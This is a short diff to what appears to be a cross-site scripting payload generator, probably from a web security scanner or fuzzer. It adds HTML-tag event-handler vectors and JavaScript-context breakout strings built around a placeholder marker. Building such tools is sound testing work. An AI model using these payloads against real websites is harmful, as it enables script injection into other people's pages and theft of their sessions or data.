@@ -54,6 +54,10 @@ class PayloadGenerator:
         "<keygen onfocus={marker} autofocus>",
         "<video><source onerror={marker}>",
         "<audio src=x onerror={marker}>",
+        "<audio src=x oncanplay={marker}>",
+        "<video><track default oncuechange={marker}>",
+        "<form><button formaction=javascript:{marker}>",
+        "<svg><animate onbegin={marker}>",
     ]
 
     # Attribute payloads
@@ -93,6 +97,9 @@ class PayloadGenerator:
         "Function('{marker}')()",
         "setTimeout('{marker}')",
         "setInterval('{marker}')",
+        ";{marker}`1`//",
+        ";location='javascript:'+{marker}//",
+        ";throw onerror={marker},1//",
     ]
 
     # CSS payloads
